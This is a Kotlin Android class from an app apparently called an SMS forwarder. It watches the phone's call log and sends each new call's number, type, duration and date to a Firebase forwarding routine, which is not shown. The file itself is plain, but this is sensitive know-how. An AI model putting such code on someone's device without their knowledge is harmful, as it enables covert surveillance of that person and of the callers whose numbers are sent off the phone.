package com.satyam.smsforwarder

import android.content.Context
import android.database.ContentObserver
import android.os.Handler
import android.provider.CallLog
import android.util.Log

class CallLogObserver(private val context: Context, handler: Handler) : ContentObserver(handler) {
    override fun onChange(selfChange: Boolean) {
        super.onChange(selfChange)
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE
                ),
                null, null,
                "${CallLog.Calls.DATE} DESC LIMIT 1"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val id = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls._ID))
                    val dur = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    
                    val prefs = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
                    val lastSavedId = prefs.getLong("last_call_id", -1L)
                    val lastSavedDur = prefs.getLong("last_call_duration", -1L)
                    
                    if (id == lastSavedId && dur == lastSavedDur) return
                    
                    prefs.edit()
                        .putLong("last_call_id", id)
                        .putLong("last_call_duration", dur)
                        .apply()

                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "Unknown"
                    val type   = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val date   = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val typeText = when (type) {
                        CallLog.Calls.INCOMING_TYPE  -> "📲 Incoming Call"
                        CallLog.Calls.OUTGOING_TYPE  -> "📞 Outgoing Call"
                        CallLog.Calls.MISSED_TYPE    -> "📵 Missed Call"
                        CallLog.Calls.REJECTED_TYPE  -> "🚫 Rejected Call"
                        else                         -> "📳 Unknown Call"
                    }
                    val mins = dur / 60
                    val secs = dur % 60
                    val durationText = if (dur > 0) "${mins}m ${secs}s" else "0s"

                    FirebaseForwarder.sendHistoricalCallLog(context, number, typeText, durationText, date)
                    Log.d("CallLogObserver", "Call forwarded: $typeText from $number")
                }
            }
        } catch (e: Exception) {
            Log.e("CallLogObserver", "Failed to read call log: ${e.message}")
        }
    }
}
